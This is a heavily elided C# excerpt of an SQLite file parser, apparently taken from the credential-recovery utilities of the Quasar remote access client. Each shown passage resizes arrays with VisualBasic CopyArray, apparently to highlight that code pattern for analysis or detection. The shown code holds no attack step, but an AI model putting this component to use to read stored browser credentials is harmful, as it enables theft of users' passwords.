...
// https://github.com/quasar/Quasar/blob/master/Quasar.Client/Recovery/Utilities/SQLiteHandler.cs
...
{
    internal class SQLite : IDisposable
    {
        ...
        public string[] GetTableNames()
        {
            ...
            for (int i = 0; i <= num3; i++)
            {
                ...
                {
                    strArray2 = (string[])Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array)strArray2, new string[index + 1]);
        ...
        private void ReadMasterTable(ulong Offset)
        {
            if (this.db_bytes[(int)Offset] == 13)
            {
                ...
                if (this.master_table_entries != null)
                {
                    ...
                    this.master_table_entries = (sqlite_master_entry[])Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array)this.master_table_entries, new sqlite_master_entry[(this.master_table_entries.Length + num2) + 1]);
                }
                else
                {
        ...
        public bool ReadTable(string TableName)
        {
            ...
            for (int j = 0; j <= num6; j++)
            {
                ...
                this.field_names = (string[])Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array)this.field_names, new string[j + 1]);
        ...
        private bool ReadTableFromOffset(ulong Offset)
        {
            if (this.db_bytes[(int)Offset] == 13)
            {
                ...
                if (this.table_entries != null)
                {
                    ...
                    this.table_entries = (table_entry[])Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array)this.table_entries, new table_entry[(this.table_entries.Length + num2) + 1]);
                }
                else
                {
                ...
                for (int i = 0; i <= num16; i++)
                {
                    ...
                    {
                        _fieldArray = (record_header_field[])Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array)_fieldArray, new record_header_field[j + 1]);
                        endIndex = num8 + 1;
